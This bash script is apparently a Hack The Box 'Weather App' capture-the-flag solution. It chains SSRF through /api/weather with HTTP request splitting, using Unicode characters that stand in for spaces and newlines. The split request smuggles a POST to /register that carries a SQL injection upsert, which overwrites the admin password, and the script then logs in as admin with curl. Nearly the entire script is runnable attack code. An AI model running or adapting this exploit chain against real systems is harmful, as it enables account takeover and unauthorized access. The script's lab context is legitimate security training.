
#!/bin/bash

# Reset
Off='\033[0m' # Text Reset

# Regular Colors
Black='\033[0;30m'  # Black
Red='\033[0;31m'    # Red
Green='\033[0;32m'  # Green
Yellow='\033[0;33m' # Yellow
Blue='\033[0;34m'   # Blue
Purple='\033[0;35m' # Purple
Cyan='\033[0;36m'   # Cyan
White='\033[0;97m'  # White


#Solution

echo -e \
"
${Green}#############################
${White}Weather App HTB Solution
echo1911

${Red}Vulnerabilities:
1. Information Disclosure,
2. SQL Injection,
3. Request Splitting and Smuggling,
4. Server Side Request Forgery
${Green}#############################
${Off}"


#vulnerable POST endpoint: /api/weather
api='/api/weather'
echo "Vulnerable endpoint: "$api

#first HTTP request
#req1="POST /api/weather HTTP/1.1\r\n
#Host: localhost:8000\r\n
#Content-Type: application/x-www-form-urlencoded\r\n
#User-Agent: WjN1eg==\r\n
#Connection: close\r\n
#Content-Length: "

#req2="458"
#req3="\r\n\r\n"

#echo -e \
#"Total Requests Size: ${Blue}${#smuggle}${Off} bytes\n
#${Green}--header--${Off}"

#echo -n "${req1}"
#echo -e -n "${req2}"
#echo "${req3}"

#echo -e "${Green}--header--${Off}"


#smuggling char replacements
spc=$'Ġ'
nwl=$'Ċ'
amp=$'Ħ'


#space = G
#newline = C

space_replace="[ %20 --> \u0120 ][${spc}]"
newline_replace="[ %0A --> \u010A ][$nwl]"
amper_replace="[ %26 --> \u0126 ][$amp]"

#echo -e \
#"
#Unicode char lengths in Bash:
#space_leng=${#spc}
#newline_len=${#nwl}
#amp_len=${#amp}
#
#"


#echo -e \
#"
#Space replacement:     $space_replace 
#Newline replacement:   $newline_replace
#Ampersand replacement: $amper_replace
#"

#SQLi upsert attack
username="admin"
yourpass="password"
password="') ON CONFLICT(username) DO UPDATE SET password='${yourpass}' --+-"
urle_spaces="${password// /%20}"
urle_sqli="${urle_spaces//\'/%27}"
localhost="127.0.0.1:80"

#smuggle body
sbody="username=${username}${amp}password=admin${urle_sqli}"
sbody_len=$((${#sbody}+1))  #off by one for some reason (likely due to ampersand unicode encoding specifics)

#main POST
mbody="endpoint=${localhost}&city=${spc}"

#send keepalive for original request
mbody+="HTTP/1.1${nwl}"
mbody+="Host:${spc}${localhost}${nwl}"
mbody+="Connection:${spc}keep-alive${nwl}${nwl}${nwl}"

#new POST request to register page
mbody+="POST${spc}/register${spc}HTTP/1.1${nwl}"
mbody+="Host:${spc}${localhost}${nwl}"
mbody+="Content-Type:${spc}application/x-www-form-urlencoded${nwl}"
mbody+="User-Agent:${spc}Mozilla/5.0${spc}(X11;${spc}Linux${spc}x86_64;${spc}rv:85.0)${spc}Gecko/20100101${spc}Firefox/85.0${nwl}"
mbody+="Connection:${spc}keep-alive${nwl}"
mbody+="Content-Length:${spc}${sbody_len}${nwl}${nwl}"

#test GET request here
#test="${nwl}${nwl}GET${spc}/?&country=register"
test=""
request=${mbody}${sbody}${test}

#echo -e \
#"SQLi Upsert: ${password}
#Url Encoded: ${urle_sqli}
#Content-length: ${sbody_len}
#"

echo "$request" > request.txt

echo "Sending POST request with curl"

ip="$1"
port="$2"
curl -d "@request.txt" -X POST "http://${ip}:${port}/api/weather" &> /dev/null

echo -e "Login with '${username}:${yourpass}' @ http://$ip:$port/login to get the flag or..." 

curl -d "username=${username}&password=${yourpass}" -X POST "http://${ip}:${port}/login"
